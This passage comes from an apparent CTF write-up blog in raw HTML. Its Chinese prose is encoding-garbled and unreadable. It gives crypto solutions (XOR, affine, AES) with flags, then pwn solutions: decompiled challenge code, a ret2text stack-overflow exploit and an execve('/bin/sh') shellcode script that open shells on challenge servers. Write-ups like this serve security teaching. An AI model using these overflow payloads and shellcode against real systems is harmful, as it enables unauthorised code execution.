class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(p) <span class="keyword">for</span> p <span class="keyword">in</span> plaintext])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext_str)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<code>flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;</code></p><h3 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h3><p>ä½¿ç”¨cyberchefï¼Œç¬¬ä¸€æ®µå¾—åˆ°<code>flag&#123;dazzling_encoding#4e0ad4</code>ï¼Œç¬¬äºŒæ®µå¾—åˆ°ï¼š<code>f0ca08d1e1d0f10c0c7afe422fea7</code>ï¼Œç¬¬ä¸‰æ®µä½¿ç”¨UUencodeè§£å¯†<a href="https://ctf.bugku.com/tool/uuencode">UUencodeåŠ å¯†&#x2F;è§£å¯† - Bugku CTF</a>ï¼Œå¾—åˆ°<code>c55192c992036ef623372601ff3a&#125;</code>ã€‚</p><p>æ‹¼æ¥ä¸€ä¸‹ï¼Œå¾—åˆ°flagï¼š<code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</code></p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>é™„ä»¶ä¸€æ®µpython</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, key</span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append((key[<span class="number">0</span>]*f + key[<span class="number">1</span>]) % <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºflagå‰4ä¸ªå­—æ¯æ˜¯flagï¼Œå› æ­¤å¯ä»¥åˆ—å‡º4ä¸ªæ–¹ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">221+256*a=key0*102+key1</span><br><span class="line">67+256*b=key0*108+key1</span><br><span class="line">136+256*c=key0*97+key1</span><br><span class="line">238+256*d=key0*103+key1</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key0 = (52 + 256 * (a - b + c - d)) / -12</span><br><span class="line">key1 = 221 + 256 * a - key0 * 102</span><br></pre></td></tr></table></figure><p>æµ‹è¯•çŒœæµ‹key0&#x3D;17ï¼Œkey1&#x3D;23</p><p>è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯†æ–‡å’Œå¯†é’¥</span></span><br><span class="line">ciphertext_hex = <span class="string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span></span><br><span class="line">key = (<span class="number">17</span>, <span class="number">23</span>)  <span class="comment"># è¯·å°†aå’Œbæ›¿æ¢ä¸ºå®é™…çš„å¯†é’¥å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—key[0]çš„æ¨¡æ•°é€†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a, m</span>):</span><br><span class="line">    m0, x0, x1 = m, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> a &gt; <span class="number">1</span>:</span><br><span class="line">        q = a // m</span><br><span class="line">        m, a = a % m, m</span><br><span class="line">        x0, x1 = x1 - q * x0, x0</span><br><span class="line">    <span class="keyword">return</span> x1 + m0 <span class="keyword">if</span> x1 &lt; <span class="number">0</span> <span class="keyword">else</span> x1</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†å¯†æ–‡è½¬æ¢ä¸ºå­—èŠ‚åˆ—è¡¨</span></span><br><span class="line">ciphertext_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€†å‘è§£å¯†</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ciphertext_bytes:</span><br><span class="line">    original_byte = ((c - key[<span class="number">1</span>]) * mod_inverse(key[<span class="number">0</span>], <span class="number">256</span>)) % <span class="number">256</span></span><br><span class="line">    flag.append(original_byte)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†è§£å¯†åçš„å­—èŠ‚åˆ—è¡¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">original_flag = <span class="built_in">bytes</span>(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(original_flag)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<code>flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</code></p><h3 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h3><p>æ‰“å¼€é™„ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">b&quot;&quot;</span>.join([<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag_ = pad(flag)</span><br><span class="line">    key = os.urandom(<span class="number">16</span>) * <span class="number">2</span></span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv) ^ <span class="number">1</span>)</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    enc_flag = aes.encrypt(flag_)</span><br><span class="line">    <span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line"><span class="comment"># b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br></pre></td></tr></table></figure><p>keyæ˜¯<strong>32bytes</strong>,<strong>256bits</strong> ï¼›ivæ˜¯<strong>16bytes ,128bits</strong></p><p>key^iv ï¼Œé‚£ä¹ˆåªæœ‰ iv ä¸ keyçš„<strong>ä½128ä½</strong>ç›¸å¼‚æˆ–ï¼Œæ‰€ä»¥<strong>keyçš„é«˜128ä½æ˜¯å›ºå®šä¸å˜çš„</strong>ã€‚æ‰€ä»¥è¾“å‡ºç»“æœçš„é«˜128bits,å°±æ˜¯keyçš„é«˜128bits,è¿›è€Œå¯ä»¥å¾—åˆ°keyçš„æ‰€æœ‰å€¼256bitsã€‚</p><p>ä¹‹åkeyçš„ä½128bitsï¼Œä¸è¾“å‡ºç»“æœçš„ä½128bitsç›¸å¼‚æˆ–ï¼Œæ‰€å¾—ç»“æœå°±æ˜¯ivçš„å€¼äº†</p><p>è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">xor = <span class="number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span>^<span class="number">1</span></span><br><span class="line">enc_flag = <span class="string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br><span class="line">out = long_to_bytes(xor)</span><br><span class="line">key = out[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"><span class="comment"># print(key)</span></span><br><span class="line">iv = bytes_to_long(key[<span class="number">16</span>:])^bytes_to_long(out[<span class="number">16</span>:])</span><br><span class="line"><span class="comment"># print(iv)</span></span><br><span class="line">iv = long_to_bytes(iv)</span><br><span class="line"><span class="comment"># print(iv)</span></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">flag = aes.decrypt(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>b&#39;firsT_cry_Aes\x00\x00\x00&#39;</code></p><p>flagï¼š<code>flag&#123;firsT_cry_Aes&#125;</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>3&#x2F;5</p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>æ ˆæº¢å‡º</p><p>idaæ‰“å¼€å‘ç°æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œè€Œä¸”è¿˜æœ‰åé—¨backdoor()å‡½æ•°</p><p>åæ±‡ç¼–ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to NewStar CTF!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Show me your magic&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>backdoorä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>backdooråœ°å€00000000004011FB</p><p>ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">return_address = <span class="number">0x4011FB</span></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€ payload</span></span><br><span class="line">payload = padding + p64(return_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥ç›®æ ‡æœåŠ¡</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27081</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="comment"># å‘é€payload</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¥æ”¶å“åº”</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>ä¹‹åç›´æ¥cat flagå³å¯æ‹¿åˆ°flagï¼š<code>flag&#123;11b564d9-fb42-41c6-a215-a750c4fc8c28&#125;</code></p><h3 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h3><p>åæ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = (<span class="type">void</span> *)(<span class="type">int</span>)mmap((<span class="type">void</span> *)<span class="number">0x66660000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to NewStar CTF!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Show me your magic&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  JUMPOUT(<span class="number">0x66660000</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥å†™shellcodeå³å¯ï¼Œç½‘ä¸Šéšä¾¿æœä¸€ä¸ªshellcodeï¼Œç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨è¿›ç¨‹</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28681</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–æ¬¢è¿ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">print</span>(r.recv())</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥shellcodeåˆ°å†…å­˜å—</span></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­è¿›ç¨‹</span></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>ç›´æ¥cat flag</p><h3 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar shop"></a>newstar shop</h3><p>ä¸»å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        shop();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        makemoney();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        dont_try();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;nothing here&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>menu()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Go to the shop &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Make some money&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Don&#x27;t choose   &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v1 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shop()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">shop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;===Welcome to newstar shop===&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.newstar&#x27;s gift          20$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.pwn write up            40$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.shell                 9999$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;All things are only available for one day!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to buy?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;nothing here&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)money &gt; <span class="number">0x13</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        money -= <span class="number">20</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You buy a newstar&#x27;s gift&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;That is the gift:&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What will happen when int transfer to unsigned int?&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)money &gt; <span class="number">0x27</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        money -= <span class="number">40</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You buy a pwn write up&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;That is free after the match,haha&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sorry,you don&#x27;t have enough money&quot;</span>);</span><br><span class="line">LABEL_10:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)money &gt; <span class="number">0x270E</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    money = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How do you buy it?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sorry,you don&#x27;t have enough money&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>makemoney()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 